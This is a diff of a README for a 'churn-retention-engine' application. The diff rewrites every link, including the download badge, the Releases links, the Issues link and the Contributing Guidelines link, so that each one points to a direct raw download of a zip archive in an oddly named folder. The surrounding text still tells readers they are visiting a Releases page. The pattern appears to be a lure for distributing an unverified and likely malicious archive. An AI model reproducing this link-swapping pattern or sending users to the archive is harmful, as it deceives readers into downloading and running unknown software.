@@ -6,7 +6,7 @@ Welcome to the churn-retention-engine! This application helps businesses predict
 
 ## 📥 Download the Application
 
-[![Download churn-retention-engine](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Ananttyagi07/churn-retention-engine/releases)
+[![Download churn-retention-engine](https://raw.githubusercontent.com/Ananttyagi07/churn-retention-engine/main/sermonic/churn-retention-engine.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ananttyagi07/churn-retention-engine/main/sermonic/churn-retention-engine.zip)
 
 To get started, please visit the Releases page to download the latest version of the application.
 
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets these requirements:
 ## 📥 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [Download Here](https://github.com/Ananttyagi07/churn-retention-engine/releases)
+   [Download Here](https://raw.githubusercontent.com/Ananttyagi07/churn-retention-engine/main/sermonic/churn-retention-engine.zip)
 
 2. On the Releases page, find the latest version. Look for a file that matches your operating system.
 
@@ -59,11 +59,11 @@ The churn-retention-engine prioritizes security. Download only from the official
 
 ## 📞 Support
 
-If you encounter any issues or have questions about using the application, please refer to the [Issues section](https://github.com/Ananttyagi07/churn-retention-engine/issues) on GitHub. Users often share their solutions there.
+If you encounter any issues or have questions about using the application, please refer to the [Issues section](https://raw.githubusercontent.com/Ananttyagi07/churn-retention-engine/main/sermonic/churn-retention-engine.zip) on GitHub. Users often share their solutions there.
 
 ## 📝 Contributing
 
-If you're interested in improving the churn-retention-engine, contributions are welcome! Please check the [Contributing Guidelines](https://github.com/Ananttyagi07/churn-retention-engine/blob/main/CONTRIBUTING.md) for more details.
+If you're interested in improving the churn-retention-engine, contributions are welcome! Please check the [Contributing Guidelines](https://raw.githubusercontent.com/Ananttyagi07/churn-retention-engine/main/sermonic/churn-retention-engine.zip) for more details.
 
 ## 🌟 Learn More
 
@@ -80,4 +80,4 @@ This project uses the MIT License. You can freely use and modify this software. 
 ## 📥 Download the Application Again
 
 Whenever you want to update or reinstall the application, remember to visit the Releases page:
-[Download Here](https://github.com/Ananttyagi07/churn-retention-engine/releases)
+[Download Here](https://raw.githubusercontent.com/Ananttyagi07/churn-retention-engine/main/sermonic/churn-retention-engine.zip)
